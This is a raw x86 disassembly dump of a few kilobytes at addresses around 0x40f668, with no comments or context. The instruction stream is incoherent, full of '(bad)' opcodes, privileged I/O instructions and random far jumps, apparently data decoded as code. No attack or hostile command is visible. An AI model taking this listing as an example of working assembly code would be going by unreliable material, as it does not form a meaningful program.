  40f668:	and    dl,al
  40f66a:	repz push edx
  40f66c:	neg    bl
  40f66e:	pop    ebp
  40f66f:	mov    cl,0x72
  40f671:	jmp    0x35a7:0xc014fa2c
  40f678:	shl    DWORD PTR [ebp+0x3c3c980b],1
  40f67e:	sar    dh,cl
  40f680:	aaa    
  40f681:	jp     0x40f60c
  40f683:	(bad)  
  40f684:	into   
  40f685:	or     bh,bl
  40f687:	lods   al,BYTE PTR ds:[esi]
  40f688:	or     al,0xfe
  40f68a:	test   ecx,ebp
  40f68c:	call   0x752f8c8a
  40f691:	test   DWORD PTR [ebp+0x1c9aaffb],ecx
  40f697:	dec    eax
  40f698:	outs   dx,DWORD PTR ds:[esi]
  40f699:	fwait
  40f69a:	pop    esi
  40f69b:	cmc    
  40f69c:	popa   
  40f69d:	in     eax,dx
  40f69e:	stos   BYTE PTR es:[edi],al
  40f69f:	mov    bh,0x91
  40f6a1:	mov    ch,cl
  40f6a3:	(bad)  
  40f6a5:	push   cs
  40f6a6:	ins    DWORD PTR es:[edi],dx
  40f6a7:	adc    BYTE PTR [ecx+0x30],bh
  40f6aa:	sub    al,BYTE PTR ds:0xcd6435f0
  40f6b0:	enter  0xaf2b,0x6b
  40f6b4:	jbe    0x40f707
  40f6b6:	ins    BYTE PTR es:[edi],dx
  40f6b7:	push   0x6d
  40f6b9:	mov    dl,BYTE PTR [edx+0x22]
  40f6bc:	xor    al,0xad
  40f6be:	ds inc eax
  40f6c0:	cwde   
  40f6c1:	mov    ebx,0x52038e3a
  40f6c6:	xchg   DWORD PTR [edi+0x39],ebp
  40f6c9:	push   edi
  40f6ca:	push   0x59ff2d49
  40f6cf:	rol    DWORD PTR [esi+edi*8],cl
  40f6d2:	repnz mov ah,0x8
  40f6d5:	xor    dl,dl
  40f6d7:	mov    edx,0x3cbbdea3
  40f6dc:	cdq    
  40f6dd:	fs or  al,0x8d
  40f6e0:	(bad)  
  40f6e2:	into   
  40f6e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6e5:	call   0xbc23:0xac64e3e1
  40f6ec:	ss cmp eax,0xf3648c15
  40f6f2:	push   ds
  40f6f3:	mov    eax,ds:0xd8bf4200
  40f6f8:	xchg   ebp,eax
  40f6f9:	test   esi,0xb737a371
  40f6ff:	cli    
  40f700:	jnp    0x40f6ca
  40f702:	mov    DWORD PTR [ecx],0xd344eb52
  40f708:	cmp    DWORD PTR [eax-0x584cc9f7],edi
  40f70e:	xor    ebx,ecx
  40f710:	xchg   edi,eax
  40f711:	jge    0x40f6a6
  40f713:	cmp    ch,BYTE PTR [ebp+0x651c733c]
  40f719:	xchg   ecx,eax
  40f71a:	jle    0x40f6af
  40f71c:	xor    eax,0x5848fc6d
  40f721:	dec    edi
  40f722:	push   es
  40f723:	das    
  40f724:	push   esp
  40f725:	imul   ebx,DWORD PTR [ecx-0x66239b37],0x1c218af2
  40f72f:	sbb    ah,BYTE PTR [ebp-0x21af7f8e]
  40f735:	pop    edi
  40f736:	scas   eax,DWORD PTR es:[edi]
  40f737:	test   DWORD PTR [edx-0xfe85516],esp
  40f73d:	adc    ebx,DWORD PTR [ebp+0x9]
  40f740:	fild   QWORD PTR [edi+0x35]
  40f743:	mov    ebx,0xaa9fd2b
  40f748:	cmp    eax,0x721c4419
  40f74d:	rcr    BYTE PTR [ecx],cl
  40f74f:	mov    ebp,0xb8f566fa
  40f754:	push   esi
  40f755:	mov    dh,0xd7
  40f757:	dec    ebx
  40f758:	xor    BYTE PTR ss:[ecx+0xc],al
  40f75c:	(bad)
  40f760:	mov    ds:0x49de2ffb,eax
  40f765:	and    ebx,DWORD PTR [eax+eiz*1+0x18]
  40f769:	rcl    ch,cl
  40f76b:	cmp    ebp,DWORD PTR [edi]
  40f76d:	ror    cl,1
  40f76f:	cmp    DWORD PTR [eax+0x4a],ebp
  40f772:	popa   
  40f773:	xor    dl,al
  40f775:	iret   
  40f776:	mov    WORD PTR [eax-0x32],cs
  40f779:	je     0x40f7ea
  40f77b:	jmp    0x40f7c3
  40f77d:	add    ch,BYTE PTR [esi+0x5f]
  40f780:	out    dx,al
  40f781:	loope  0x40f75d
  40f783:	lahf   
  40f784:	dec    ebp
  40f785:	sbb    bh,bl
  40f787:	mov    ah,0x2b
  40f789:	dec    edx
  40f78a:	(bad)  [edi]
  40f78c:	jmp    0xd24bf197
  40f791:	jb     0x40f80f
  40f793:	dec    edi
  40f794:	daa    
  40f795:	nop
  40f796:	sbb    DWORD PTR [esi],edx
  40f798:	test   BYTE PTR [ebx],0x67
  40f79b:	dec    ebx
  40f79c:	das    
  40f79d:	cs mov dh,0x97
  40f7a0:	adc    eax,DWORD PTR [edx]
  40f7a2:	push   esi
  40f7a3:	sti    
  40f7a4:	andps  xmm4,XMMWORD PTR [edx+edx*4-0x16b060cf]
  40f7ac:	adc    BYTE PTR cs:[ebp+0xf62e5a6],0xde
  40f7b4:	sbb    eax,0x5f14de48
  40f7b9:	adc    ecx,edx
  40f7bb:	aad    0x71
  40f7bd:	adc    ebp,DWORD PTR [edx]
  40f7bf:	outs   dx,DWORD PTR ds:[esi]
  40f7c0:	aaa    
  40f7c1:	ja     0x40f7e8
  40f7c3:	mov    dh,0x97
  40f7c5:	dec    ebp
  40f7c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7c7:	repz inc eax
  40f7c9:	in     al,dx
  40f7ca:	rol    BYTE PTR [ecx+eax*2],1
  40f7cd:	fs (bad) 
  40f7cf:	in     eax,dx
  40f7d0:	jbe    0x40f80a
  40f7d2:	arpl   WORD PTR [ecx-0x6410d7ac],ax
  40f7d8:	sbb    eax,DWORD PTR [ecx]
  40f7da:	cwde   
  40f7db:	pop    ebx
  40f7dc:	and    al,0x9e
  40f7de:	and    eax,0x7647fd4d
  40f7e3:	sub    al,0x95
  40f7e5:	mov    DWORD PTR [ebp+0x76],ebp
  40f7e8:	cmp    DWORD PTR [esi],ecx
  40f7ea:	adc    esi,eax
  40f7ec:	jl     0x40f812
  40f7ee:	jmp    0x11f2dddd
  40f7f3:	push   edi
  40f7f4:	in     al,dx
  40f7f5:	sub    DWORD PTR [eax+0x75],ecx
  40f7f8:	cmp    edi,DWORD PTR [edi]
  40f7fa:	mov    ebx,0xfa268adb
  40f7ff:	imul   ebx,DWORD PTR [edi-0x1ddb7187],0x8e6b10a2
  40f809:	out    dx,al
  40f80a:	in     eax,0x2c
  40f80c:	mov    dh,0xb3
  40f80e:	ss mov ebp,0x3c7d5127
  40f814:	mov    BYTE PTR [edi+0x4a07908b],cl
  40f81a:	iret   
  40f81b:	int3   
  40f81c:	mov    eax,0x7e2b9da0
  40f821:	imul   edi,DWORD PTR [ecx-0x38],0x8f4f0851
  40f828:	pop    ds
  40f829:	aam    0x66
  40f82b:	ins    WORD PTR es:[edi],dx
  40f82d:	cmp    ah,BYTE PTR [edi+0x41]
  40f830:	inc    esp
  40f831:	add    BYTE PTR [edi+0x6a53ab48],bl
  40f837:	mov    ds:0x6b8f8a5c,eax
  40f83c:	sbb    bl,al
  40f83e:	call   0x591d:0x84b2e710
  40f845:	sub    ebp,DWORD PTR [ebp+eax*4-0x7aca9e79]
  40f84c:	mov    edx,0x7f800eca
  40f851:	xor    BYTE PTR [ebx+ecx*2-0x70],dl
  40f855:	(bad)  
  40f856:	push   ebp
  40f857:	test   al,0x94
  40f859:	mov    cl,0x1
  40f85b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f85c:	and    BYTE PTR [esi],bh
  40f85e:	push   ss
  40f85f:	jno    0x40f8bc
  40f861:	jmp    0x6f13:0x73a95fb3
  40f868:	jl     0x40f8d0
  40f86a:	or     edx,DWORD PTR [edx+0x67]
  40f86d:	fbstp  TBYTE PTR [edx+0x57aef9e9]
  40f873:	xchg   DWORD PTR [ebp+esi*2-0x3],esi
  40f877:	les    ebp,FWORD PTR [esi]
  40f879:	in     al,0xd9
  40f87b:	(bad)
  40f87e:	inc    ebx
  40f87f:	sti    
  40f880:	mov    dl,0xa3
  40f882:	sti    
  40f883:	cs dec edx
  40f885:	popf   
  40f886:	mov    WORD PTR [edx-0x4ea4c70],fs
  40f88c:	pusha  
  40f88d:	pop    es
  40f88e:	push   ebp
  40f88f:	(bad)  
  40f890:	cmc    
  40f891:	call   0x849abdf4
  40f896:	sub    DWORD PTR [ecx-0x5c6909b1],edx
  40f89c:	cmp    edx,DWORD PTR [edx+0x5d]
  40f89f:	loop   0x40f8e0
  40f8a1:	retf   
  40f8a2:	mov    DWORD PTR [ebp-0x3f],ebp
  40f8a5:	jnp    0x40f8a4
  40f8a7:	dec    esp
  40f8a8:	xchg   BYTE PTR [ebx+0x488bac75],dh
  40f8ae:	dec    esi
  40f8af:	mov    ds:0x622f4aaf,eax
  40f8b4:	retf   0x6f44
  40f8b7:	repz mov edx,0x62e2e896
  40f8bd:	jmp    0x813d:0xd76af44b
  40f8c4:	xlat   BYTE PTR ds:[ebx]
  40f8c5:	aad    0x3e
  40f8c7:	dec    esi
  40f8c8:	adc    al,BYTE PTR es:[edx+0x5fe66577]
  40f8cf:	jns    0x40f8bd
  40f8d1:	jo     0x40f89f
  40f8d3:	rol    DWORD PTR [edi-0x34],0x35
  40f8d7:	ins    DWORD PTR es:[edi],dx
  40f8d8:	fscale 
  40f8da:	xor    bl,BYTE PTR ds:0xef42c559
  40f8e0:	inc    edi
  40f8e1:	push   cs
  40f8e2:	add    ebp,DWORD PTR [edi-0x2e]
  40f8e5:	inc    ebx
  40f8e6:	(bad)  
  40f8e7:	call   0x89ba:0x26022df0
  40f8ee:	sbb    DWORD PTR [ecx+0x7be878e7],0x7b
  40f8f5:	dec    esi
  40f8f6:	jns    0x40f8e3
  40f8f8:	jno    0x40f94a
  40f8fa:	add    al,0xa0
  40f8fc:	sbb    eax,0x7fdaabae
  40f901:	add    cl,dl
  40f903:	iret   
  40f904:	xor    BYTE PTR [ecx-0x45],bh
  40f907:	jnp    0x40f8ce
  40f909:	push   0xffffffc2
  40f90b:	jae    0x40f8b6
  40f90d:	repnz mov dh,0xb0
  40f910:	call   DWORD PTR [esi-0x2b8f28f9]
  40f916:	mov    BYTE PTR [ebx+0x3c],dh
  40f919:	dec    eax
  40f91a:	lock test BYTE PTR [esi],bh
  40f91d:	mov    esp,0xde364579
  40f922:	ret    
  40f923:	imul   esp,DWORD PTR ss:[edx+0x4e],0x98cb5a74
  40f92b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f92c:	cmp    eax,0x82a126f5
  40f931:	je     0x40f8e1
  40f933:	call   0x2525:0xbe68b7cb
  40f93a:	jl     0x40f98f
  40f93c:	mov    BYTE PTR [esp+eax*2+0x25],ah
  40f940:	jns    0x40f987
  40f942:	and    al,0x81
  40f944:	cmp    ecx,0xffffffb6
  40f947:	retf   
  40f948:	(bad)  
  40f949:	rcl    BYTE PTR [esi-0x5b],0xd2
  40f94d:	loope  0x40f975
  40f94f:	mov    ?,WORD PTR [edx]
  40f951:	aam    0x2a
  40f953:	ficomp WORD PTR ds:0x6061cfa0
  40f959:	xlat   BYTE PTR ds:[ebx]
  40f95a:	pop    DWORD PTR [esi+0x51]
  40f95d:	nop
  40f95e:	jge    0x40f965
  40f960:	pop    ebp
  40f961:	out    0x36,al
  40f963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f964:	xor    eax,0x1c429bdd
  40f969:	ss push ecx
  40f96b:	std    
  40f96c:	mov    eax,0x6fd76ac0
  40f971:	mov    edi,0x5e8e0f2d
  40f976:	and    BYTE PTR [esi-0x7f1e2fae],bh
  40f97c:	pop    ds
  40f97d:	mov    al,ds:0xd0c60c11
  40f982:	or     eax,0x7ff3095f
  40f987:	hlt    
  40f988:	dec    ecx
  40f989:	and    cl,BYTE PTR [edi-0x490a8628]
  40f98f:	gs repnz push ebx
  40f992:	xor    ebp,ebx
  40f994:	jle    0x40f94c
  40f996:	fisttp WORD PTR [edi+0x24]
  40f999:	in     eax,dx
  40f99a:	mov    eax,ds:0x8bfda606
  40f99f:	xchg   BYTE PTR [ebp+edx*1+0x5365fedc],cl
  40f9a6:	and    al,0x5e
  40f9a8:	mov    ds:0xf64c1ef7,eax
  40f9ad:	adc    DWORD PTR [edx],edi
  40f9af:	sub    ecx,esi
  40f9b1:	(bad)  
  40f9b2:	sbb    al,0x25
  40f9b4:	cld    
  40f9b5:	pop    esi
  40f9b6:	jp     0x40f9e9
  40f9b8:	inc    edx
  40f9b9:	arpl   WORD PTR [ebp-0x25],bp
  40f9bc:	lock test eax,0xcbfdfab
  40f9c2:	adc    BYTE PTR [esi-0x4f754343],0xe1
  40f9c9:	xchg   ecx,eax
  40f9ca:	mov    ebp,0xdcc602c5
  40f9cf:	mov    WORD PTR [ecx-0x33cfc6a],gs
  40f9d5:	jno    0x40f9fb
  40f9d7:	into   
  40f9d8:	pop    edi
  40f9d9:	jl     0x40f9ba
  40f9db:	or     eax,0xefa1ad90
  40f9e0:	jp     0x40f9f6
  40f9e2:	out    dx,eax
  40f9e3:	adc    eax,0x401a4d34
  40f9e8:	(bad)  
  40f9ea:	loope  0x40fa4f
  40f9ec:	cmp    BYTE PTR [edi+0x77],ch
  40f9ef:	pusha  
  40f9f0:	test   ebx,0xecd97f6f
  40f9f6:	into   
  40f9f7:	ret    0xfb0d
  40f9fa:	sbb    dh,ah
  40f9fc:	bound  edi,QWORD PTR [ebx-0x10]
  40f9ff:	repnz aad 0x66
  40fa02:	push   edx
  40fa03:	add    eax,0x7a037cb0
  40fa08:	fidivr WORD PTR [edx-0x41d1c8cd]
  40fa0e:	add    esp,DWORD PTR [eax+eax*2]
  40fa11:	stos   DWORD PTR es:[edi],eax
  40fa12:	mov    bh,0x33
  40fa14:	cmp    esi,DWORD PTR [esi-0x32]
  40fa17:	into   
  40fa18:	loope  0x40f9e4
  40fa1a:	rcr    DWORD PTR [ebx+0x35],1
  40fa1d:	add    ebx,DWORD PTR [esi+0x37]
  40fa20:	popf   
  40fa21:	std    
  40fa22:	pop    esp
  40fa23:	sub    DWORD PTR [edx],0xf73a5c19
  40fa29:	lea    esi,[edi*2-0xbbe078a]
  40fa30:	xchg   ecx,eax
  40fa31:	sub    ecx,DWORD PTR [edx-0x730e2ba5]
  40fa37:	sbb    DWORD PTR [edx+0x1bff8753],0x2afd676a
  40fa41:	aaa    
  40fa42:	iret   
  40fa43:	ret    
  40fa44:	jmp    0x40fa57
  40fa46:	jge    0x40fa7f
  40fa48:	mov    esp,0x3d1e0714
  40fa4d:	adc    esi,DWORD PTR [edx]
  40fa4f:	iret   
  40fa50:	jg     0x40fa0a
  40fa52:	out    dx,eax
  40fa53:	pop    es
  40fa54:	xchg   edi,eax
  40fa55:	xor    al,0x87
  40fa57:	jmp    0xf4619185
  40fa5c:	push   ecx
  40fa5d:	adc    eax,DWORD PTR [esi+0x69]
  40fa60:	or     al,dl
  40fa62:	xor    BYTE PTR [esi+0x1e],ch
  40fa65:	scas   al,BYTE PTR es:[edi]
  40fa66:	out    dx,al
  40fa67:	jge    0x40fa4c
  40fa69:	inc    esp
  40fa6a:	sbb    ecx,esp
  40fa6c:	mov    eax,ds:0x21c4c3f5
  40fa71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa72:	and    dh,BYTE PTR [eax+0x67]
  40fa75:	ficom  DWORD PTR [ebx*1+0x2df437df]
  40fa7c:	fiadd  WORD PTR [ebp+ebp*1+0x4f]
  40fa80:	mov    al,0x82
  40fa82:	and    ecx,DWORD PTR [ebx+0x9]
  40fa85:	sbb    BYTE PTR [ecx],bh
  40fa87:	push   edi
  40fa88:	test   DWORD PTR [edx+0x18],ebp
  40fa8b:	dec    ebp
  40fa8c:	std    
  40fa8d:	push   ebx
  40fa8e:	pop    es
  40fa8f:	jno    0x40fa9e
  40fa91:	mov    edi,DWORD PTR [eax+0xc]
  40fa94:	daa    
  40fa95:	std    
  40fa96:	sub    al,0xd1
  40fa98:	leave  
  40fa99:	push   edx
  40fa9a:	sbb    ch,BYTE PTR [esi+0x2331f7b8]
  40faa0:	sahf   
  40faa1:	nop
  40faa2:	xlat   BYTE PTR ds:[ebx]
  40faa3:	jnp    0x40fabf
  40faa5:	shr    BYTE PTR [eax-0x6adbcf3d],0x89
  40faac:	or     al,0x5f
  40faae:	pop    ds
  40faaf:	inc    ecx
  40fab0:	into   
  40fab1:	stos   BYTE PTR es:[edi],al
  40fab2:	mov    bh,0xd7
  40fab4:	jno    0x40fafa
  40fab6:	out    0x6b,eax
  40fab8:	adc    BYTE PTR [edx+ebp*8],bh
  40fabb:	aam    0x6c
  40fabd:	add    DWORD PTR [ecx+0x20],edx
  40fac0:	mov    ds:0x4a0db8ce,al
  40fac5:	call   0x5e14:0xc0ba1921
  40facc:	mov    ch,0xf5
  40face:	iret   
  40facf:	push   esi
  40fad0:	shr    DWORD PTR [edi+0x2446dc36],0xa9
  40fad7:	pop    es
  40fad8:	cwde   
  40fad9:	xchg   ebp,eax
  40fada:	jb     0x40fa8c
  40fadc:	inc    ebx
  40fadd:	ja     0x40fb07
  40fadf:	cmp    DWORD PTR [edx+0xc],eax
  40fae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fae3:	push   esi
  40fae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fae5:	dec    edi
  40fae6:	xor    BYTE PTR ds:0x8abe159f,bl
  40faec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faed:	ja     0x40fa7c
  40faef:	xchg   BYTE PTR [edx+0x66],dl
  40faf2:	mov    WORD PTR [edx-0x1d8a6cf4],ds
  40faf8:	ret    
  40faf9:	push   edx
  40fafa:	cdq    
  40fafb:	arpl   WORD PTR [eax+0x4540497c],bp
  40fb01:	push   edi
  40fb02:	or     eax,0xb982b4f
  40fb07:	jge    0x40faa3
  40fb09:	jp     0x40fae0
  40fb0b:	ficomp DWORD PTR [eax-0x23]
  40fb0e:	push   0xe8e57c66
  40fb13:	fadd   DWORD PTR [edi+ecx*4]
  40fb16:	in     eax,dx
  40fb17:	shl    BYTE PTR [ecx-0x7c],1
  40fb1a:	push   0x74e192a9
  40fb1f:	cmp    DWORD PTR [ebp-0x7a],0x65
  40fb23:	in     eax,dx
  40fb24:	sbb    BYTE PTR [ebx+ebx*2-0x45861619],bh
  40fb2b:	sub    ch,BYTE PTR [esi]
  40fb2d:	xor    ah,ah
  40fb2f:	mov    bl,0x9b
  40fb31:	mov    ds:0x65840b66,eax
  40fb36:	sbb    edx,ecx
  40fb38:	ins    DWORD PTR es:[edi],dx
  40fb39:	js     0x40fb19
  40fb3b:	or     al,0x29
  40fb3d:	xor    BYTE PTR [ebx],dl
  40fb3f:	mov    ss,esi
  40fb41:	adc    al,0x7a
  40fb43:	into   
  40fb44:	jae    0x40faf1
  40fb46:	inc    edx
  40fb47:	xchg   edi,eax
  40fb48:	test   edx,ebx
  40fb4a:	je     0x40faef
  40fb4c:	ret    
  40fb4d:	xchg   BYTE PTR [edi-0xe],dl
  40fb50:	mov    esp,0x926274bc
  40fb55:	mov    DWORD PTR [ecx],eax
  40fb57:	jp     0x40fb80
  40fb59:	jnp    0x40fbac
  40fb5b:	aaa    
  40fb5c:	dec    eax
  40fb5d:	jno    0x40faf1
  40fb5f:	pop    esp
  40fb60:	dec    esi
  40fb61:	mov    ah,0x57
  40fb63:	fisub  WORD PTR [eax+0x33]
  40fb66:	mov    ds:0x85d2352e,eax
  40fb6b:	stc    
  40fb6c:	(bad)  
  40fb6d:	aam    0xe2
  40fb6f:	adc    eax,0x245c2aef
  40fb74:	(bad)  
  40fb75:	jo     0x40fb5a
  40fb77:	push   edx
  40fb78:	das    
  40fb79:	sbb    dl,BYTE PTR [eax]
  40fb7b:	ret    
  40fb7c:	(bad)  
  40fb7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb7e:	cmp    edi,DWORD PTR [eax+ebp*8+0x53c8d0de]
  40fb85:	mov    edi,0x8ce4029b
  40fb8a:	aaa    
  40fb8b:	cmp    DWORD PTR [ecx],ecx
  40fb8d:	jno    0x40fb64
  40fb8f:	ds jne 0x40fbb8
  40fb92:	add    esp,DWORD PTR [edx+0x18]
  40fb95:	xor    ah,BYTE PTR [ecx+eiz*2+0x64]
  40fb99:	jo     0x40fb47
  40fb9b:	ret    
  40fb9c:	ret    0xec6e
  40fb9f:	mov    cs,WORD PTR ds:0x53aab353
  40fba5:	es jne 0x40fb49
  40fba8:	ret    0x9187
  40fbab:	test   al,0x21
  40fbad:	aaa    
  40fbae:	clc    
  40fbaf:	or     ecx,DWORD PTR [ebp+0x2a]
  40fbb2:	pushf  
  40fbb3:	(bad)  
  40fbb4:	scas   al,BYTE PTR es:[edi]
  40fbb5:	cdq    
  40fbb6:	out    dx,eax
  40fbb7:	sbb    eax,0x8c82ac32
  40fbbc:	stos   DWORD PTR es:[edi],eax
  40fbbd:	stc    
  40fbbe:	cs cmp eax,0xc1de3aac
  40fbc4:	xchg   esp,eax
  40fbc5:	adc    ebx,edi
  40fbc7:	call   0xbc9a:0x4272aff4
  40fbce:	jb     0x40fbe6
  40fbd0:	xchg   esi,eax
  40fbd1:	dec    ebx
  40fbd2:	addr16 jnp 0x40fbd9
  40fbd5:	hlt    
  40fbd6:	pop    ds
  40fbd7:	xchg   edi,eax
  40fbd8:	dec    ecx
  40fbd9:	fidiv  DWORD PTR [ecx]
  40fbdb:	and    DWORD PTR [ebp+0x40],esi
  40fbde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbdf:	std    
  40fbe0:	lods   al,BYTE PTR ds:[esi]
  40fbe1:	and    BYTE PTR [ebx-0x71],ah
  40fbe4:	test   al,0x19
  40fbe6:	loope  0x40fbe2
  40fbe8:	mov    bl,0x9d
  40fbea:	dec    ecx
  40fbeb:	mov    al,0xa9
  40fbed:	std    
  40fbee:	and    DWORD PTR [edx-0x1d],edx
  40fbf1:	stos   DWORD PTR es:[edi],eax
  40fbf2:	inc    edi
  40fbf3:	xchg   DWORD PTR [eax],esp
  40fbf5:	icebp  
  40fbf6:	fmul   DWORD PTR [di-0x7c]
  40fbfa:	iret   
  40fbfb:	imul   edx,DWORD PTR [esi-0x76],0x2c
  40fbff:	or     al,0x97
  40fc01:	loop   0x40fc0f
  40fc03:	jne    0x40fbb8
  40fc05:	(bad)  
  40fc06:	lea    esi,[eax+0x3570f1de]
  40fc0c:	inc    ecx
  40fc0d:	shl    DWORD PTR [ecx-0x1c6878ab],cl
  40fc13:	dec    esi
  40fc14:	call   0x4a87d0f6
  40fc19:	cdq    
  40fc1a:	mov    esp,0xa80d309e
  40fc1f:	ins    BYTE PTR es:[edi],dx
  40fc20:	out    dx,al
  40fc21:	fucomip st,st(2)
  40fc23:	add    BYTE PTR [edi-0x53de6420],ch
  40fc29:	adc    BYTE PTR [edx-0x6e],dl
  40fc2c:	and    DWORD PTR [ebp-0x165cd160],ebx
  40fc32:	jecxz  0x40fc10
  40fc34:	push   eax
  40fc35:	sti    
  40fc36:	fwait
  40fc37:	stos   BYTE PTR es:[edi],al
  40fc38:	jmp    0x6902f51d
  40fc3d:	sbb    eax,0x45c2939d
  40fc42:	xchg   ecx,eax
  40fc43:	push   es
  40fc44:	dec    eax
  40fc45:	xor    bh,BYTE PTR [eax]
  40fc47:	ja     0x40fc6b
  40fc49:	pminub mm0,QWORD PTR [ecx+0x1f]
  40fc4d:	lock out dx,eax
  40fc4f:	add    ah,BYTE PTR [edi-0x4e]
  40fc52:	out    dx,eax
  40fc53:	test   BYTE PTR [ebx],0xe8
  40fc56:	mov    bl,0xda
  40fc58:	sbb    eax,0x8b4cf76a
  40fc5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc5e:	adc    eax,0x80a591d9
  40fc63:	icebp  
  40fc64:	out    0x92,eax
  40fc66:	fucomp st(2)
  40fc68:	arpl   WORD PTR ds:0x95c826f2,si
  40fc6e:	pop    eax
  40fc6f:	push   edx
  40fc70:	(bad)  
  40fc71:	aam    0x7d
  40fc73:	ret    0x5df
  40fc76:	sbb    eax,0xf6fa5325
  40fc7b:	loop   0x40fcce
  40fc7d:	sti    
  40fc7e:	loopne 0x40fcd3
  40fc80:	out    0x37,eax
  40fc82:	adc    DWORD PTR [ecx-0x3469f9a1],ebp
  40fc88:	ret    
  40fc89:	mov    edx,0x2ee90507
  40fc8e:	daa    
  40fc8f:	xor    ebp,0x16
  40fc92:	jmp    0xafbf14cc
  40fc97:	dec    edi
  40fc98:	xchg   ecx,eax
  40fc99:	ds inc edx
  40fc9b:	cmp    eax,0xfb4909cd
  40fca0:	dec    edx
  40fca1:	cli    
  40fca2:	in     al,0xcd
  40fca4:	pop    esp
  40fca5:	call   0x488c:0x365abc0a
  40fcac:	mov    eax,ds:0xd2c50a62
  40fcb2:	fs dec esi
  40fcb4:	jp     0x40fcfe
  40fcb6:	popa   
  40fcb7:	rcl    bl,cl
  40fcb9:	adc    DWORD PTR [edi+esi*8+0x69624c1],0x79
  40fcc1:	in     al,0xb5
  40fcc3:	xchg   ebx,eax
  40fcc4:	test   al,0x24
  40fcc6:	cmp    ecx,DWORD PTR [edi+0x3d]
  40fcc9:	jmp    DWORD PTR [edx-0x1a]
  40fccc:	(bad)  
  40fccd:	adc    DWORD PTR [ebp+0x1d97a4c6],ecx
  40fcd3:	addr16 xchg ebx,eax
  40fcd5:	loop   0x40fd30
  40fcd7:	test   eax,0x16fc0c93
  40fcdc:	dec    ebp
  40fcdd:	and    al,0xb4
  40fcdf:	lock stc 
  40fce1:	cmc    
  40fce2:	jno    0x40fc64
  40fce4:	jb     0x40fcb2
  40fce6:	out    0xb3,eax
  40fce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fce9:	addr16 js 0x40fcdf
  40fcec:	inc    ecx
  40fced:	mov    ds:0x46d9a9a5,al
  40fcf2:	push   0x82bc7759
  40fcf7:	cmp    DWORD PTR [edx+0x2b],edx
  40fcfa:	pop    ds
  40fcfb:	dec    eax
  40fcfc:	jmp    0x40fc8e
  40fcfe:	mov    fs,WORD PTR ds:[edi+0x1d]
  40fd02:	addr16 jbe 0x40fd3f
  40fd05:	jno    0x40fcfe
  40fd07:	mov    dh,0x2b
  40fd09:	cmp    al,0x4a
  40fd0b:	dec    ecx
  40fd0c:	stos   BYTE PTR es:[edi],al
  40fd0d:	loopne 0x40fc99
  40fd0f:	iret   
  40fd10:	mov    bl,0xf8
  40fd12:	sub    BYTE PTR [eax+0x74368f80],dl
  40fd18:	or     edx,ebx
  40fd1a:	std    
  40fd1b:	mov    esi,0x56010e19
  40fd20:	mov    ch,0x6b
  40fd22:	xor    al,0x29
  40fd24:	lods   al,BYTE PTR ds:[esi]
  40fd25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd26:	call   0xf4f901a7
  40fd2b:	jmp    0x7ae3:0x54b2dfaf
  40fd32:	or     DWORD PTR [ecx+edx*4],esp
  40fd35:	pop    ss
  40fd36:	ins    DWORD PTR es:[edi],dx
  40fd37:	jl     0x40fd86
  40fd39:	jg     0x40fd33
  40fd3b:	push   ss
  40fd3c:	cmc    
  40fd3d:	test   BYTE PTR [eax],ah
  40fd3f:	xor    ch,BYTE PTR [ebp-0x7c]
  40fd42:	sbb    ch,bl
  40fd44:	pusha  
  40fd45:	jmp    0x40fd72
  40fd47:	mov    ds:0x4b0cd2fd,al
  40fd4c:	mov    esp,0x33821a09
  40fd51:	hlt    
  40fd52:	pop    ebx
  40fd53:	or     esp,ebp
  40fd55:	sti    
  40fd56:	jae    0x40fd2c
  40fd58:	jg     0x40fcfc
  40fd5a:	push   0xffffffbe
  40fd5c:	push   ss
  40fd5d:	jmp    0x24f2:0x92654df0
  40fd64:	mov    ebx,0xe20cb709
  40fd69:	sbb    dh,BYTE PTR [eax]
  40fd6b:	mov    ah,0xd
  40fd6d:	mov    DWORD PTR [eax],ebx
  40fd6f:	pushf  
  40fd70:	adc    eax,0xfacb453
  40fd75:	sbb    ah,BYTE PTR [eax]
  40fd77:	push   0xe4e5310c
  40fd7c:	adc    al,0x2f
  40fd7e:	pop    eax
  40fd7f:	jns    0x40fd7c
  40fd81:	mov    al,ds:0x1a97310f
  40fd86:	in     eax,dx
  40fd87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd88:	or     cl,0x1b
  40fd8b:	retf   0x803b
  40fd8e:	shr    DWORD PTR [ebx+0x60ea6dd9],cl
  40fd94:	mov    WORD PTR [ecx],es
  40fd96:	cmc    
  40fd97:	sub    cl,al
  40fd99:	out    dx,eax
  40fd9a:	nop
  40fd9b:	out    dx,al
  40fd9c:	adc    eax,0xdba5a853
  40fda1:	pusha  
  40fda2:	(bad)  
  40fda3:	pop    esi
  40fda4:	fs leave 
  40fda6:	inc    esp
  40fda7:	jmp    0x40fdfa
  40fda9:	pop    es
  40fdaa:	sub    al,0xde
  40fdac:	xchg   esp,eax
  40fdad:	out    dx,eax
  40fdae:	pop    esi
  40fdaf:	jnp    0x40fd7f
  40fdb1:	fucomi st,st(0)
  40fdb3:	dec    esi
  40fdb4:	jl     0x40fd8a
  40fdb6:	rol    ah,cl
  40fdb8:	test   al,0x9c
  40fdba:	leave  
  40fdbb:	pusha  
  40fdbc:	mov    edi,0x69826b10
  40fdc1:	add    BYTE PTR [bp+di+0x1e],bl
  40fdc5:	sbb    al,0xc5
  40fdc7:	jge    0x40fdc2
  40fdc9:	in     al,dx
  40fdca:	(bad)  [eax]
  40fdcc:	fcmovnb st,st(7)
  40fdce:	cmp    eax,0xcdb97101
  40fdd3:	sbb    esp,DWORD PTR [ebp+0x7ec94d88]
  40fdd9:	pop    ebp
